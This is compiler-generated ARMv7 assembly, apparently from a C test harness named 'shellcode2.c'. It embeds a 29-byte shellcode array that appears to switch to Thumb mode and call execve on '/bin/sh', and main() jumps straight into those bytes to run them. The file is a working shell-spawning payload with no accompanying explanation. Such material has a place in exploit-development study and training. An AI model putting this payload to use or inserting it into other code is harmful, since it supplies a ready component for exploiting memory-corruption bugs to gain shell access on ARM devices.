	.arch armv7-a
	.eabi_attribute 28, 1
	.eabi_attribute 20, 1
	.eabi_attribute 21, 1
	.eabi_attribute 23, 3
	.eabi_attribute 24, 1
	.eabi_attribute 25, 1
	.eabi_attribute 26, 2
	.eabi_attribute 30, 6
	.eabi_attribute 34, 1
	.eabi_attribute 18, 4
	.file	"shellcode2.c"
	.global	shellcode
	.data
	.align	2
	.type	shellcode, %object
	.size	shellcode, 29
shellcode:
	.ascii	"\0010\217\342\023\377/\341\002\240I@R@\302q\013'\001"
	.ascii	"\337/bin/shx\000"
	.text
	.align	2
	.global	main
	.syntax unified
	.arm
	.fpu vfpv3-d16
	.type	main, %function
main:
	@ args = 0, pretend = 0, frame = 8
	@ frame_needed = 1, uses_anonymous_args = 0
	push	{fp, lr}
	add	fp, sp, #4
	sub	sp, sp, #8
	movw	r3, #:lower16:shellcode
	movt	r3, #:upper16:shellcode
	str	r3, [fp, #-8]
	ldr	r3, [fp, #-8]
	blx	r3
	mov	r3, #0
	mov	r0, r3
	sub	sp, fp, #4
	@ sp needed
	pop	{fp, pc}
	.size	main, .-main
	.ident	"GCC: (GNU) 7.2.1 20170915 (Red Hat Cross 7.2.1-1)"
	.section	.note.GNU-stack,"",%progbits
